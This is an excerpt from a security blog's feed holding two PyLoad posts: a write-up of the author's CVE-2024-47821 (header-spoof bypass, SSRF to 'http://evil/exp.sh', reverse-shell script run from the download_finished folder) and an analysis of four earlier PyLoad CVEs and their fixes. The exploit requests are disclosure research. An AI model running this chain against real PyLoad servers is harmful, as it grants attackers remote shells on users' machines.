</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Forbidden&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> wrapper
</span></span></code></pre></div><p>The <code>local_check</code> function relies on the HTTP Host header to determine if the request came from a local address. The HTTP Host header can be manipulated by the sender of the request - and therefore can be spoofed to bypass this check (I will dive into more details in a later section). Combining the <code>local_check</code> bypass and the payload for CVE-2024-28397, I was able to achieve remote code execution in PyLoad.</p>
<p>I reported this issue to the PyLoad developers, but it turned out that the researcher who discovered CVE-2024-28397 had already reported it to PyLoad - which in hindsight was pretty obvious, since their repo mentions PyLoad is vulnerable to this CVE. At the time of me (re)discovering that PyLoad is vulnerable to CVE-2024-28397, there was no advisory for this issue for PyLoad - so I had decided to report it anyway. A few days later, an advisory was released - crediting the original reporter of CVE-2024-28397.</p>
<p>Since my submission was deemed a duplicate, I set out to find a new CVE in PyLoad - something that did not rely on existing CVEs in libraries used by PyLoad. I went back to the APIs listed in <a href="https://github.com/pyload/pyload/blob/develop/src/pyload/webui/app/blueprints/cnl_blueprint.py"><code>cnl_blueprint.py</code></a> (the same file where the <code>/flash/addcrypted2</code> API and the <code>local_check</code> function are defined). Since I knew I could bypass the <code>local_check</code>, I wanted to find another API that performs some &ldquo;dangerous&rdquo; operation.</p>
<h2 id="blind-server-side-request-forgery">Blind Server Side Request Forgery</h2>
<p>The <code>cnl_blueprint.py</code> file has another API <code>/flashgot</code> which in addition to the <code>local_check</code> has a Referer header check. This header check can also be bypassed by just setting it to something PyLoad will accept.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/flashgot_pyload&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>], endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flashgot&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@local_check</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flashgot</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>referrer <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://localhost:9666/flashgot&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>,
</span></span><span style="display:flex;"><span>    ):
</span></span><span style="display:flex;"><span>        flask<span style="color:#f92672">.</span>abort(<span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>    
</span></span></code></pre></div><p>Combining the headers to bypass both checks, I arrived at headers like this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
</span></span></code></pre></div><p>The <code>flashgot</code> API has a functionality to provide an URL from which PyLoad will download a file. There is additional parameter <code>autostart</code> which when provided results in PyLoad automatically downloading the file without any user interaction. Sending a request like below will download the file at the URL, to a folder named as per the <code>package</code> parameter, in the download location set in PyLoad (by default its <code>~/Downloads</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://pyload/flashgot&#34;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;host&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:9666&#34;</span>, <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:9666/flashgot&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;example_packge&#34;</span>,  
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
</span></span></code></pre></div><p>I created a file <code>exp.sh</code> which contained a basic bash reverse shell and exposed it using a Python simple HTTP server. Once I sent the request, PyLoad downloaded the <code>exp.sh</code> to <code>~/Downloads/example_package/exp.sh</code>. This is a blind SSRF vulnerability, but it is not particularly interesting. An attacker can probably use this to download malware into a system running PyLoad - but its not as interesting as code execution.</p>
<h2 id="escalating-the-ssrf-to-remote-code-execution">Escalating the SSRF to Remote Code Execution</h2>
<p>The next step in my journey to find remote code execution was to somehow execute the reverse shell script. There are a few other CVEs in PyLoad where a file was downloaded to certain folders to have them execute or render - leading to remote code execution. However, as a fix for these issues, certain paths could not be set as the download folder.</p>
<p>Purely by chance, while I was staring at PyLoad logs, I found a log line that said &ldquo;No script found under folder download_finished&rdquo;. This implied that a user can specify scripts that are run when downloads are finished. Looking for this folder on my system, I came across a folder <code>~/.pyload/scripts</code> which has many subfolders for different triggers such as <code>download_finished</code>, <code>package_processed</code> and so on.</p>
<p>I added a script to the <code>download_finished</code> folder and then sent a download request to <code>/flashgot</code>. Once the file was downloaded, the script I added to <code>download_finished</code> executed! From there, the path to remote code execution was pretty straighforward. I had to change a few PyLoad settings:</p>
<ol>
<li>Change the download folder to <code>~/.pyload/scripts</code></li>
<li>Change permissions of downloads: on</li>
<li>Permission mode for downloaded files: 0744</li>
</ol>
<p><img src="/cve-2024-47821-1.png" alt="download-location"></p>
<p>I also changed my request to <code>/flashgot</code> to set the <code>package</code> to <code>download_finised</code> so that the script is downloaded to the <code>download_finished</code> folder.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;package&#34;</span>: <span style="color:#e6db74">&#34;download_finished&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;passwords&#34;</span>: <span style="color:#e6db74">&#34;optional_password&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;urls&#34;</span>: <span style="color:#e6db74">&#34;http://evil/exp.sh&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;autostart&#34;</span>: <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Sending this request once downloads <code>exp.sh</code> (which is a bash reverse shell) to the <code>download_finished</code> folder.</p>
<p><img src="/cve-2024-47821-2.png" alt="download-finished"></p>
<p>Sending it a second time downloads <code>exp.sh</code> again into the folder, but crucially also executes the existing <code>exp.sh</code> script.</p>
<p><img src="/cve-2024-47821-3.png" alt="script-exec"></p>
<p>I set up a simple <code>nc</code> listener where I received a reverse shell once <code>exp.sh</code> was executed. Remote code execution acheived, system compromised.</p>
<p><img src="/cve-2024-47821-4.png" alt="rce"></p>
<h2 id="a-small-word-regarding-my-setup">A small word regarding my setup</h2>
<p>A while back I had purchased a Raspberry Pi - and as with quite a few things I buy - I played with it for a week or two and then it just sat at my desk (in that one week I installed pihole on it - so it is not completely useless). So on a whim, I decided to install PyLoad on the Pi instead of my laptop. This turned out to be an important decision - as this led me to discovering the <code>local_check</code> function. If I was testing PyLoad on my laptop itself, the <code>local_check</code> would not have triggered. I might have found the other issues anyway, but bypassing the <code>local_check</code> check makes the finding &ldquo;complete&rdquo;.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That was a fun ride! My first CVE will always be special, but it being a remote code execution issue makes it even better. Having to chain multiple bugs was a great exercise for my research skills. Finding this CVE gives me the confidence and motivation to continue hunting. My aim for this year was to find one CVE. Having found that, and with a couple months remaining in the year - maybe I will find more?</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>September 8, 2024: Issue reported to PyLoad via GitHub.</li>
<li>October 4, 2024: Report accepted by PyLoad maintainers.</li>
<li>October 7, 2024: CVE 2024-47821 assigned.</li>
<li>October 25, 2024: Patched version of PyLoad released, blog published.</li>
</ul>
<p>Thank you for reading! Take care!</p>
]]></content>
        </item>
        
        <item>
            <title>Analyzing new-ish CVEs in PyLoad</title>
            <link>http://localhost:1313/posts/pyload-cves/</link>
            <pubDate>Sat, 20 Apr 2024 07:56:09 -0700</pubDate>
            
            <guid>http://localhost:1313/posts/pyload-cves/</guid>
            <description>&lt;p&gt;&lt;a href=&#34;https://pyload.net/&#34;&gt;PyLoad&lt;/a&gt; is an open source download manager written in Python. I first came across PyLoad while solving a HackTheBox machine (PC). Solving the machine required exploiting a pre-auth RCE (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2023-0297&#34;&gt;CVE-2023-0297&lt;/a&gt;). I then rediscovered PyLoad when I was looking for CVEs to analyze. My intention was to analyze around 3-4 CVEs in the same product and PyLoad fit the bill perfectly, as there were 4 CVEs disclosed in January and February 2024. In this article, I will explain the CVEs, examine the provided proof of concepts, and evaluate the fixes.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p><a href="https://pyload.net/">PyLoad</a> is an open source download manager written in Python. I first came across PyLoad while solving a HackTheBox machine (PC). Solving the machine required exploiting a pre-auth RCE (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0297">CVE-2023-0297</a>). I then rediscovered PyLoad when I was looking for CVEs to analyze. My intention was to analyze around 3-4 CVEs in the same product and PyLoad fit the bill perfectly, as there were 4 CVEs disclosed in January and February 2024. In this article, I will explain the CVEs, examine the provided proof of concepts, and evaluate the fixes.</p>
<h2 id="cve-2024-24808-open-redirect">CVE-2024-24808 (Open Redirect)</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24808">CVE-2024-24808</a> is a open redirect vulnerability in PyLoad due to incorrect sanitization of the redirect URL which allows an attacker to bypass the URL sanitization function and redirect users to arbitrary URLs. The details provided here are taken from the <a href="https://github.com/pyload/pyload/security/advisories/GHSA-g3cm-qg2v-2hj5">detailed advisory</a> available in the PyLoad repository.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>PyLoad allows redirecting users to a new page after login by using a <code>next</code> query parameter (eg: <code>https://pyload.test/login?next=home</code>). PyLoad parses the provided <code>next</code> parameter and performs some checks in the <code>get_redirect_url</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>  next <span style="color:#f92672">=</span> get_redirect_url(fallback<span style="color:#f92672">=</span>flask<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#34;app.dashboard&#34;</span>))
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_redirect_url</span>(fallback<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    login_url <span style="color:#f92672">=</span> urljoin(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root, flask<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#39;app.login&#39;</span>))
</span></span><span style="display:flex;"><span>    request_url <span style="color:#f92672">=</span> unquote(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> location <span style="color:#f92672">in</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>values<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;next&#34;</span>), flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>referrer:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> location:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> location <span style="color:#f92672">in</span> (request_url, login_url):  <span style="color:#75715e"># don&#39;t redirect to same location</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_safe_url(location):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> location
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> fallback
</span></span></code></pre></div><p>One of the performed checks is <code>is_safe_url</code>, which is supposed to check if the URL provided is in the same host. The check should return <code>False</code> when arbitrary URLs, outside the domain in which PyLoad is running, are tested.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#: Checks if location belongs to same host address</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_safe_url</span>(location):
</span></span><span style="display:flex;"><span>    ref_url <span style="color:#f92672">=</span> urlparse(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host_url)
</span></span><span style="display:flex;"><span>    test_url <span style="color:#f92672">=</span> urlparse(urljoin(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>host_url, location))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> test_url<span style="color:#f92672">.</span>scheme <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;http&#39;</span>, <span style="color:#e6db74">&#39;https&#39;</span>) <span style="color:#f92672">and</span> ref_url<span style="color:#f92672">.</span>netloc <span style="color:#f92672">==</span> test_url<span style="color:#f92672">.</span>netloc
</span></span></code></pre></div><p>This works for the most part, except if malformed URLs are provided to <code>urlparse</code>. According to <a href="https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlparse"><code>urlparse</code></a> documentation, any malformed URLs are presumed to be a relative URL. This means it has no <code>netloc</code> and has a <code>path</code> component.</p>
<pre tabindex="0"><code>urlparse(&#34;http://a.xyz&#34;)
ParseResult(scheme=&#39;http&#39;, netloc=&#39;a.xyz&#39;, path=&#39;&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)

urlparse(&#34;http:///a.xyz&#34;)
ParseResult(scheme=&#39;http&#39;, netloc=&#39;&#39;, path=&#39;/a.xyz&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
</code></pre><p>Therefore, when a malformed URL is provided to <code>is_safe_url</code> it returns <code>True</code>, i.e. the URL is safe. This can be seen in the example below. The provided <code>location</code> is first joined to the request host URL (<code>localhost:8080</code>) and then parsed with <code>urlparse</code> in <code>is_safe_url</code>. When malformed URL, <code>http:///a.xyz</code>, is provided, after <code>urljoin</code>, <code>a.xyz</code> is joined to <code>localhost:8080</code> as the malformed URL is treated as a path. This causes the test to return <code>True</code>.</p>
<pre tabindex="0"><code>Location: /home
Joined URL: http://localhost:8080/home
Ref URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
Test URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/home&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
True

Location: http://a.xyz
Joined URL: http://a.xyz
Ref URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
Test URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;a.xyz&#39;, path=&#39;&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
False

Location: http:///a.xyz
Joined URL: http://localhost:8080/a.xyz
Ref URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
Test URL: ParseResult(scheme=&#39;http&#39;, netloc=&#39;localhost:8080&#39;, path=&#39;/a.xyz&#39;, params=&#39;&#39;, query=&#39;&#39;, fragment=&#39;&#39;)
True
</code></pre><p>When <code>is_safe_url</code> returns <code>True</code>, the redirect URL is set to the malformed URL <code>http:///a.xyz</code> which is then normalized to <code>http://a.xyz</code> leading to open redirect.</p>
<h3 id="fix">Fix</h3>
<p>The vulnerability is fixed by <a href="https://github.com/pyload/pyload/commit/fe94451dcc2be90b3889e2fd9d07b483c8a6dccd">this PR</a>.</p>
<p>In the PR, the <code>is_safe_url</code> function is updated, but I did not find any usages of the function, so I will not discuss it here. The fix appears to be modifying the <code>get_redirect_url</code> function to use <code>flask.url_for</code>. According to the <a href="https://flask.palletsprojects.com/en/3.0.x/api/#flask.Flask.url_for">documentation</a> <code>url_for</code> can be used to generate URLs for an endpoint. If an endpoint is not found for the provided value, it throws a <code>werkzeug.routing.BuildError</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_redirect_url</span>(fallback<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    next_arg <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>values<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;next&#34;</span>)
</span></span><span style="display:flex;"><span>    redirect_url <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>url_for(fallback)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> next_arg <span style="color:#f92672">and</span> next_arg <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;login&#34;</span>:  <span style="color:#75715e"># don&#39;t redirect to same location</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            redirect_url <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;app.</span><span style="color:#e6db74">{</span>next_arg<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> werkzeug<span style="color:#f92672">.</span>routing<span style="color:#f92672">.</span>BuildError:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> urljoin(flask<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>url_root, redirect_url)
</span></span></code></pre></div><p>Now for any provided value of <code>next</code>, <code>flask</code> will attempt to build a URL for <code>app.{next_arg}</code> and if its not found, it will redirect to the fallback.</p>
<pre tabindex="0"><code>/home &lt;-- this endpoint exists
127.0.0.1 - - [16/Mar/2024 11:19:35] &#34;GET /?next=home HTTP/1.1&#34; 200 -
Could not build url for endpoint &#39;http:///example.com&#39;. Did you mean &#39;hello_world&#39; instead?
127.0.0.1 - - [16/Mar/2024 11:19:45] &#34;GET /?next=http:///example.com HTTP/1.1&#34; 200 
</code></pre><hr>
<h2 id="cve-2024-22416-cross-site-request-forgery">CVE-2024-22416 (Cross Site Request Forgery)</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22416">CVE-2024-22416</a> is a cross site request forgery (CSRF) vulnerability in PyLoad. The <code>SameSite</code> attribute in the session cookie used with PyLoad APIs is not set to <code>SameSite: strict</code>. This allows an attacker to make API calls using GET requests on behalf of other users via a CSRF attack, thereby performing actions on behalf of said users. The details provided here are taken from the <a href="https://github.com/pyload/pyload/security/advisories/GHSA-pgpj-v85q-h5fm">advisory</a> available in the PyLoad repository.</p>
<h3 id="vulnerability-1">Vulnerability</h3>
<p>There is not much to explain for this CVE. It is a textbook CSRF vulnerability, as the cookie is not prevented from being sent in cross site requests. If an attacker can trick a legitimate user to visit a malicious site, which has an embedded GET request to a PyLoad API, the browser will make the GET request and send the cookies of the legitimate user with the request (provided the user was logged in, and had a valid session cookie in the cookie jar). This will lead to PyLoad performing the action associated with the API as if the legitimate user is performing it. The example in the advisory mentions the <code>/add_user</code> API, which can be called with a username and a password like <code>api/add_user/%22username%22,%22password%22</code>. When triggered via an admin&rsquo;s session token, a user with username  <code>username</code> and password <code>password</code> will be created with admin privileges.</p>
<h3 id="fix-1">Fix</h3>
<p>The vulnerability is fixed by <a href="https://github.com/pyload/pyload/commit/1374c824271cb7e927740664d06d2e577624ca3e">this PR</a>.</p>
<p>Flask provides a <code>config</code> object that allows setting certain Flask configuration values. One of the values that can be configured is <a href="https://flask.palletsprojects.com/en/3.0.x/config/#SESSION_COOKIE_SAMESITE"><code>SESSION_COOKIE_SAMESITE</code></a> that sets the value of the <code>SameSite</code> attribute of the session cookie. The fix is setting this to <code>Strict</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;SESSION_COOKIE_SAMESITE&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Strict&#34;</span>
</span></span></code></pre></div><hr>
<h2 id="cve-2024-21644-flask-configuration-leak">CVE-2024-21644 (Flask configuration leak)</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21644">CVE-2024-21644</a> is a configuration leak vulnerabilty in PyLoad which allows an unauthenticated user to view the Flask config used by PyLoad including secrets by browsing to a specific URL.The details provided here are taken from the <a href="https://github.com/pyload/pyload/security/advisories/GHSA-mqpq-2p68-46fv">advisory</a> available in the PyLoad repository.</p>
<h3 id="vulnerability-2">Vulnerability</h3>
<p>This vulnerability is caused due to an interesting mix of circumstances. First, there is a route <code>/render/&lt;path:filename&gt;</code> which allows an unautheticated user to view predefined templates.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#a6e22e">@bp.route</span>(<span style="color:#e6db74">&#34;/render/&lt;path:filename&gt;&#34;</span>, endpoint<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;render&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render</span>(filename):
</span></span><span style="display:flex;"><span>    mimetype <span style="color:#f92672">=</span> mimetypes<span style="color:#f92672">.</span>guess_type(filename)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;text/html&#34;</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> render_template(filename)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>Response(data, mimetype<span style="color:#f92672">=</span>mimetype)
</span></span></code></pre></div><p>Next, there is a template <code>info.html</code> which renders a variable named <code>config</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">tr</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">td</span>&gt;{{ _(&#34;Config folder:&#34;) }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">td</span>&gt;{{ config }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">tr</span>&gt;
</span></span></code></pre></div><p>In normal operation, the value of config is supposed to be provided using the <code>render_template</code> function. In this case <code>**context</code> provides the values to display to <code>info.html</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>context <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;python&#34;</span>: sys<span style="color:#f92672">.</span>version,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;os&#34;</span>: <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>join((os<span style="color:#f92672">.</span>name, sys<span style="color:#f92672">.</span>platform) <span style="color:#f92672">+</span> extra),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;version&#34;</span>: api<span style="color:#f92672">.</span>get_server_version(),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;folder&#34;</span>: PKGDIR,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;config&#34;</span>: api<span style="color:#f92672">.</span>get_userdir(),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;download&#34;</span>: conf[<span style="color:#e6db74">&#34;general&#34;</span>][<span style="color:#e6db74">&#34;storage_folder&#34;</span>][<span style="color:#e6db74">&#34;value&#34;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;freespace&#34;</span>: format<span style="color:#f92672">.</span>size(api<span style="color:#f92672">.</span>free_space()),
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;webif&#34;</span>: conf[<span style="color:#e6db74">&#34;webui&#34;</span>][<span style="color:#e6db74">&#34;port&#34;</span>][<span style="color:#e6db74">&#34;value&#34;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;language&#34;</span>: conf[<span style="color:#e6db74">&#34;general&#34;</span>][<span style="color:#e6db74">&#34;language&#34;</span>][<span style="color:#e6db74">&#34;value&#34;</span>],
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;info.html&#34;</span>, <span style="color:#f92672">**</span>context)
</span></span></code></pre></div><p>However, all Flask templates also receive the Flask configuration as a variable named <code>config</code>. Therefore, when <code>info.html</code> is requested using <code>/render</code>, since a second parameter is not sent to <code>render_template</code>, the <code>config</code> value used to render <code>info.html</code> is the Flask configuration which contains sensitive information. These sensitive values are then displayed to an unauthenticated user.</p>
<h3 id="fix-2">Fix</h3>
<p>This issue is fixed by <a href="https://github.com/pyload/pyload/commit/bb22063a875ffeca357aaf6e2edcd09705688c40">this PR</a>. The fix is quite simple: the <code>config</code> variable in <code>info.html</code> is renamed to <code>config_folder</code>.</p>
<hr>
<h2 id="cve-2024-21645-log-injection">CVE-2024-21645 (Log Injection)</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21645">CVE-2024-21645</a> is a log injection vulnerability in PyLoad that allows an attacker to inject arbitrary logs by sending a crafted <code>username</code> parameter while attempting to log in.</p>
<h3 id="vulnerability-3">Vulnerability</h3>
<p>PyLoad logs the username provided on an unsuccessful login attempt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>api <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>current_app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;PYLOAD_API&#34;</span>]
</span></span><span style="display:flex;"><span>user_info <span style="color:#f92672">=</span> api<span style="color:#f92672">.</span>check_auth(user, password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user_info:
